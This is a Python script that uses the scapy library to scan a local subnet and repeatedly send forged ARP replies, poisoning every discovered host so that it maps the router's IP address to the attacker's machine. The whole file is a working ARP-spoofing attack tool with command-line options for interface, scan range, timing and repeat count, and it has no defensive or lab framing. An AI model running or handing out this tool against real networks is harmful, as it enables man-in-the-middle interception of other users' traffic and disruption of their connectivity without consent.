import scapy.all as scapy
import time
import optparse
import re
import subprocess


# Function to perform ARP poisoning
def arp_poisoning(target_ip, poisoned_ip, target_mac):
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False, count=20)


# Function to get MAC address of a given IP
def get_mac_address(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)
    broadcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')

    merged = broadcast_packet / arp_request
    mac_list = scapy.srp(merged, timeout=1, verbose=False)[0]

    if mac_list:
        mac_address = mac_list[0][1].hwsrc
        return mac_address
    else:
        return None


# Function to get source IP address
def source_ip_address():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-i", "--interface", dest="interface")
    parse_object.add_option("-s", "--scan", dest="scan")
    parse_object.add_option("-w", "--wait", dest="wait")
    parse_object.add_option("-r", "--re_arp", dest="re_arp")
    parse_object.add_option("-t", "--timeout", dest="timeout")
    (keys, values) = parse_object.parse_args()

    ifconfig = subprocess.check_output(["ifconfig", keys.interface])
    suc_mac = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", str(ifconfig))

    if suc_mac:
        return suc_mac.group(0), keys
    else:
        return None


# Function to get router IP address
def router_ip_address(source_ip):
    ip_route = subprocess.check_output(["ip", "route"])
    ip_value = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", str(ip_route))

    ip_list = list(ip_value)

    for i in ip_list:
        if i == source_ip:
            ip_list.remove(source_ip)

    router_ip_1 = ip_list[0].split('.')
    router_ip_2 = ip_list[1].split('.')

    if router_ip_1[-1] == '0' or router_ip_2[-1] == '1' and router_ip_1[-1] == '1' or router_ip_2[-1] == '0':
        ip_list.remove(f'{router_ip_1[0]}.{router_ip_1[1]}.{router_ip_1[2]}.0')

    return ip_list[0]


# Function to perform IP scanning using scapy
def scapy_ip_scan(source_ip, scan, timeout):
    suc_mac = []

    arp_request = scapy.ARP(pdst=str(source_ip) + '/' + str(scan))
    broadcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')

    merged = broadcast_packet / arp_request
    (answer_list, unanswer_list) = scapy.srp(merged, timeout=int(timeout))

    for i in list(answer_list):
        ip_address = set(re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", str(i)))
        ip_address.remove(str(source_ip))
        suc_mac.append(ip_address)

    return suc_mac


# Getting local IP address
local_ip_address = source_ip_address()
# Getting router IP address
router_ip_address = router_ip_address(local_ip_address[0])

mac_ip_list = []


while True:
    # Scanning for IP addresses
    ip_list = scapy_ip_scan(local_ip_address[0], local_ip_address[1].scan, local_ip_address[1].timeout)
    send = 0
    # Performing ARP poisoning
    for _ in range(int(local_ip_address[1].re_arp)):
        for i in ip_list:
            mac_ip_list_value = []
            mac = get_mac_address(''.join(i))
            arp_poisoning(''.join(i), router_ip_address, mac)
            send += 1
            print(f'\rSend ARP: {send}', end='')
    subprocess.call(["clear"])
    time.sleep(float(local_ip_address[1].wait)) # Delay before next iteration
